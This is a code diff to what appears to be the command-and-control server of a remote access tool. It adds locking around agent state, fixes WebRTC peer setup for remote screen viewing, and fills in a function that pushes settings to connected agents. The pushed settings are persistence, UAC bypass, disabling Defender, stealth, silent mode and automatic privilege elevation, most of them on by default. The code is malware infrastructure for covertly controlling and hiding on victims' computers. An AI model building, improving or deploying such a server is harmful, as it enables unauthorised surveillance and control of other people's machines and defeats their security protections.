@@ -528,14 +528,19 @@ def create_webrtc_peer_connection(agent_id):
         return None
     
     try:
-        pc = RTCPeerConnection()
+        # Import RTCConfiguration from aiortc
+        from aiortc import RTCConfiguration, RTCIceServer
         
-        # Configure ICE servers
-        for ice_server in WEBRTC_CONFIG['ice_servers']:
-            pc.addIceServer(ice_server)
+        # Configure ICE servers properly for aiortc
+        ice_servers = [RTCIceServer(urls=server['urls']) for server in WEBRTC_CONFIG['ice_servers']]
+        configuration = RTCConfiguration(iceServers=ice_servers)
+        
+        # Create peer connection with configuration
+        pc = RTCPeerConnection(configuration=configuration)
         
         # Store the peer connection
-        WEBRTC_PEER_CONNECTIONS[agent_id] = pc
+        with WEBRTC_PEER_CONNECTIONS_LOCK:
+            WEBRTC_PEER_CONNECTIONS[agent_id] = pc
         
         # Set up event handlers
         @pc.on("connectionstatechange")
@@ -2406,10 +2411,11 @@ def get_agents():
 @require_auth
 def get_agent_details(agent_id):
     """Get detailed information about a specific agent"""
-    if agent_id not in AGENTS_DATA:
-        return jsonify({'error': 'Agent not found'}), 404
-    
-    data = AGENTS_DATA[agent_id]
+    with AGENTS_DATA_LOCK:
+        if agent_id not in AGENTS_DATA:
+            return jsonify({'error': 'Agent not found'}), 404
+        
+        data = AGENTS_DATA[agent_id].copy()  # Make a copy to avoid holding the lock
     agent_info = {
         'id': agent_id,
         'name': data.get('name', f'Agent-{agent_id}'),
@@ -3523,7 +3529,34 @@ def handle_join_room(room_name):
         print(f"Agent list sent to operator {request.sid}")
 
 def _emit_agent_config(agent_id: str):
-    return
+    """Emit configuration updates to a specific agent"""
+    try:
+        agent_data = AGENTS_DATA.get(agent_id)
+        if not agent_data or not agent_data.get('sid'):
+            return
+        
+        # Load current settings
+        settings = load_settings()
+        
+        # Prepare agent configuration
+        agent_config = {
+            'persistence': settings.get('agent', {}).get('defaultPersistence', True),
+            'uac_bypass': settings.get('agent', {}).get('enableUACBypass', True),
+            'defender_disable': settings.get('agent', {}).get('enableDefenderDisable', False),
+            'advanced_persistence': settings.get('agent', {}).get('enableAdvancedPersistence', True),
+            'silent_mode': settings.get('agent', {}).get('silentMode', True),
+            'stealth': settings.get('agent', {}).get('enableStealth', True),
+            'auto_elevate': settings.get('agent', {}).get('autoElevatePrivileges', True),
+            'heartbeat_interval': settings.get('server', {}).get('heartbeatInterval', 30),
+            'command_timeout': settings.get('server', {}).get('commandTimeout', 30),
+            'auto_reconnect': settings.get('server', {}).get('autoReconnect', True)
+        }
+        
+        # Emit configuration to agent
+        socketio.emit('update_config', agent_config, room=agent_data['sid'])
+        print(f"Configuration sent to agent {agent_id}")
+    except Exception as e:
+        print(f"Error emitting config to agent {agent_id}: {e}")
 
 @socketio.on('request_agent_list')
 def handle_request_agent_list():
@@ -4217,19 +4250,21 @@ def handle_webrtc_viewer_connect(data):
         return
     
     try:
-        # Create viewer peer connection
-        viewer_pc = RTCPeerConnection()
+        # Create viewer peer connection with proper configuration
+        from aiortc import RTCConfiguration, RTCIceServer
         
-        # Configure ICE servers
-        for ice_server in WEBRTC_CONFIG['ice_servers']:
-            viewer_pc.addIceServer(ice_server)
+        # Configure ICE servers properly for aiortc
+        ice_servers = [RTCIceServer(urls=server['urls']) for server in WEBRTC_CONFIG['ice_servers']]
+        configuration = RTCConfiguration(iceServers=ice_servers)
+        viewer_pc = RTCPeerConnection(configuration=configuration)
         
         # Store viewer data
-        WEBRTC_VIEWERS[viewer_id] = {
-            'agent_id': agent_id,
-            'pc': viewer_pc,
-            'streams': {}
-        }
+        with WEBRTC_VIEWERS_LOCK:
+            WEBRTC_VIEWERS[viewer_id] = {
+                'agent_id': agent_id,
+                'pc': viewer_pc,
+                'streams': {}
+            }
         
         # Add existing tracks from agent
         agent_streams = WEBRTC_STREAMS[agent_id]
@@ -4759,14 +4794,16 @@ def handle_agent_notification(data):
 def handle_heartbeat(data):
     """Handle heartbeat from agents to keep them alive"""
     agent_id = data.get('agent_id')
-    if agent_id and agent_id in AGENTS_DATA:
-        AGENTS_DATA[agent_id]["last_seen"] = datetime.datetime.utcnow().isoformat() + "Z"
-        # Update performance metrics if provided
-        if 'performance' in data:
-            perf = data['performance']
-            AGENTS_DATA[agent_id]["cpu_usage"] = perf.get('cpu', 0)
-            AGENTS_DATA[agent_id]["memory_usage"] = perf.get('memory', 0)
-            AGENTS_DATA[agent_id]["network_usage"] = perf.get('network', 0)
+    if agent_id:
+        with AGENTS_DATA_LOCK:
+            if agent_id in AGENTS_DATA:
+                AGENTS_DATA[agent_id]["last_seen"] = datetime.datetime.utcnow().isoformat() + "Z"
+                # Update performance metrics if provided
+                if 'performance' in data:
+                    perf = data['performance']
+                    AGENTS_DATA[agent_id]["cpu_usage"] = perf.get('cpu', 0)
+                    AGENTS_DATA[agent_id]["memory_usage"] = perf.get('memory', 0)
+                    AGENTS_DATA[agent_id]["network_usage"] = perf.get('network', 0)
         
         # Acknowledge heartbeat
         emit('heartbeat_ack', {'timestamp': datetime.datetime.utcnow().isoformat() + 'Z'})
@@ -4783,38 +4820,48 @@ def cleanup_disconnected_agents():
                 timeout_threshold = 300  # 5 minutes
                 
                 disconnected_agents = []
-                for agent_id, data in list(AGENTS_DATA.items()):
-                    if data.get('last_seen'):
-                        try:
-                            last_seen = datetime.datetime.fromisoformat(data['last_seen'].replace('Z', '+00:00'))
-                            if last_seen.tzinfo is None:
-                                last_seen = last_seen.replace(tzinfo=datetime.timezone.utc)
-                            
-                            if (current_time.replace(tzinfo=datetime.timezone.utc) - last_seen).total_seconds() > timeout_threshold:
-                                disconnected_agents.append(agent_id)
-                        except Exception as e:
-                            print(f"Error parsing last_seen for agent {agent_id}: {e}")
-                            disconnected_agents.append(agent_id)
+                # First, identify disconnected agents (with lock)
+                with AGENTS_DATA_LOCK:
+                    for agent_id, data in list(AGENTS_DATA.items()):
+                        if data.get('last_seen'):
+                            try:
+                                last_seen = datetime.datetime.fromisoformat(data['last_seen'].replace('Z', '+00:00'))
+                                if last_seen.tzinfo is None:
+                                    last_seen = last_seen.replace(tzinfo=datetime.timezone.utc)
+                                
+                                if (current_time.replace(tzinfo=datetime.timezone.utc) - last_seen).total_seconds() > timeout_threshold:
+                                    disconnected_agents.append((agent_id, data.get("name", f"Agent-{agent_id}")))
+                            except Exception as e:
+                                print(f"Error parsing last_seen for agent {agent_id}: {e}")
+                                disconnected_agents.append((agent_id, data.get("name", f"Agent-{agent_id}")))
                 
-                # Clean up disconnected agents
-                for agent_id in disconnected_agents:
-                    agent_name = AGENTS_DATA[agent_id].get("name", f"Agent-{agent_id}")
-                    del AGENTS_DATA[agent_id]
+                # Clean up disconnected agents (with lock)
+                if disconnected_agents:
+                    with AGENTS_DATA_LOCK:
+                        for agent_id, agent_name in disconnected_agents:
+                            if agent_id in AGENTS_DATA:  # Double-check it's still there
+                                del AGENTS_DATA[agent_id]
+                        
+                        # Make a copy for emitting
+                        agents_copy = dict(AGENTS_DATA)
                     
-                    # Notify operators
-                    socketio.emit('agent_list_update', AGENTS_DATA, room='operators')
-                    socketio.emit('activity_update', {
-                        'id': f'act_{int(time.time())}',
-                        'type': 'connection',
-                        'action': 'Agent Timeout',
-                        'details': f'Agent {agent_id} timed out (no heartbeat)',
-                        'agent_id': agent_id,
-                        'agent_name': agent_name,
-                        'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
-                        'status': 'warning'
-                    }, room='operators')
+                    # Notify operators (outside lock)
+                    socketio.emit('agent_list_update', agents_copy, room='operators')
                     
-                    print(f"Agent {agent_id} timed out and was removed")
+                    # Emit activity updates for each disconnected agent
+                    for agent_id, agent_name in disconnected_agents:
+                        socketio.emit('activity_update', {
+                            'id': f'act_{int(time.time())}_{agent_id}',
+                            'type': 'connection',
+                            'action': 'Agent Timeout',
+                            'details': f'Agent {agent_id} timed out (no heartbeat)',
+                            'agent_id': agent_id,
+                            'agent_name': agent_name,
+                            'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
+                            'status': 'warning'
+                        }, room='operators')
+                        
+                        print(f"Agent {agent_id} ({agent_name}) timed out and was removed")
                 
                 time.sleep(60)  # Check every minute
             except Exception as e:
